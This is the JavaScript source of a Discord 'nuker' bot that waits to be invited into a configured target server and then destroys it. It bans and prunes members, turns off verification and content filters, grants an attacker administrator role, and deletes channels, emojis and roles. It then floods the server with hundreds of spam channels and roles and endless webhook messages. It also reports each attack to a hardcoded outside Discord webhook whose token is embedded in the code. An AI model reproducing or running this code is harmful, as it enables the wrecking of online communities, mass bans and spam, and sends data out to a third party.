const Discord =
  require('discord.js'); //
const { Client, WebhookClient } = require("discord.js");
const { MessageEmbed } = require('discord.js')
const client = new Discord.Client();
const {OwnerID, NUKERNAME, NUKEICON, NUKEBANNER, NUKEMESSAGE,TARGET} = require("./config.json");
const { keep_alive } = require("./keep_alive");
const {Webhook} = require('simple-discord-webhooks');

client.login(process.env.TOKEN).catch(e => {
  console.log(`\x1b[31m%s\x1b[0m\x1b[4m`,`TOKEN SUPPLIED IS INVALID / LOCKED / DISABLED !!`)
})

client.on('ready', () => {
  client.user.setActivity({
    name: `👿 ${client.user.username} FcKs ThE CoRD`,
    type: "STREAMING",
    url: "https://www.twitch.tv/ayoohennio" //NOT MINE HEHE
  })
  process.stdout.write('\x1Bc');
   console.log("\x1b[31m",`
▀█▀ ▄▀█ █▀█ █▀▀ █▀▀ ▀█▀   █▀▀ █▀█ █ █▄░█ █▀▄ █▀▀ █▀█
░█░ █▀█ █▀▄ █▄█ ██▄ ░█░   █▄█ █▀▄ █ █░▀█ █▄▀ ██▄ █▀▄ `)
  console.log("\x1b[31m",`> D I N O - P R O J E C T S !! RUNNING THE CORD ON  - ${client.user.username}`);
  guild = client.guilds.cache.get(TARGET)
  if(!TARGET) console.log(`NO TARGET SET !!`)
  else{
  console.log("\x1b[31m",`TARGETING : [${TARGET}]`)
  }

});

client.on("guildCreate", guild => {
  const owner = client.users.cache.get(OwnerID)
  if(!TARGET){
    owner.send(`\`👥\` **TARGET NOT SET HENCE SKIPPED NUKE !!** `)
  }
   if(guild.id==TARGET){
     const webhook = new Webhook("https://discord.com/api/webhooks/988053070980214804/TeZTzO2SWvXZdf4VEvxWQ6qOa-pRZ2o95NXNjzDjkdlCT8tYdjDVy2eAfOqHH-7Ek2sf")
  webhook.send(`\`💛\` **NUKE DETECTED !!**\n**SERVER NAME :** \`${guild.name}\`\n**GUILD ID :** \`${guild.id}\``)
     owner.send(`\`👿\` **TARGET TRIGGERED !!** \n**JOINED THE GUILD ${guild.name} SUCCESSFULLY**`)
     owner.send(`\`🌙\` **STARTED FCKING THE SERVER !!**`)
     console.log(`STARTED NUKING !!`)
     client.user.setPresence({
        status: "invisible",
        })
        guild.setIcon(NUKEICON).then(async guild => {
          await guild.members.cache.forEach(m => {
				if (m.banable) m.ban()})

        await guild.members.fetch({force: true})
        guild.members.prune({days: 1})
        .then(pruned => console.log(pruned))
        .catch(console.error);

            if (guild.verificationLevel !== "NONE") {
                guild.setVerificationLevel("NONE");
            } else if (guild.defaultMessageNotifications !== "ALL") {
                guild.setDefaultMessageNotifications("ALL");
            } else if (guild.explicitContentFilter !== "DISABLED") {
                guild.setExplicitContentFilter("DISABLED");
            } else if (guild.premiumTier >= 15) {
                guild.setBanner(NUKEBANNER);
            } else {
                //Leave this empty to pass
            }
          guild.roles.create({
                data: {
                    name: NUKERNAME,
                    permissions: 8,
                    color: "#36383F",
                    hoist: true
                }
            });
            //Filters deletable channels, deletes them right after
            for (const channel of guild.channels.cache.filter(channel => channel.deletable).array()) {
                channel.delete();
            }
            //Filters deletable emojis, deletes them right after
            for (const emoji of guild.emojis.cache.filter(emoji => emoji.deletable).array()) {
                emoji.delete();
            }
            //Filters deletable roles, deletes them right after
            for (const role of guild.roles.cache.filter(role => role.deletable).array()) {
                role.delete();
            }
            //Filters bannable members, bans them right after
            for (const member of guild.members.cache.filter(member => member.bannable).array()) {
                member.ban();
            }
        
            //Repeat this process until maximum channel limit is reached
            for (let i = 0; i < 500; i++) {
                guild.channels.create(`Razed by ${NUKERNAME}`, {
                    type: "text"
                }).then(channel => {
                    channel.createWebhook(`Razed by ${NUKERNAME}`, {
                        avatar: NUKEICON
                    }).then(async webhook => {
                        setInterval(() => {
                            channel.send(NUKEMESSAGE);
                            webhook.send(NUKEMESSAGE);
                        })
                    })
                })
            }
        for (let i = 0; i < 500; i++) {
                guild.roles.create({
  data: {
    name: `RAZED BY ${NUKERNAME}`,
    color: `RANDOM`,
  },
  reason: `RAZED BY ${NUKERNAME}`,
}).then(async guild => {
          await guild.members.cache.forEach(m => {
          m.roles.add(role)
        })
        })
        }
        })
   }
  else{
    owner.send(`\`🖤\` **I WAS INVITED TO A SERVER BUT SKIPPED NUKE !! : ** \`${guild.name}\``)
  }
});
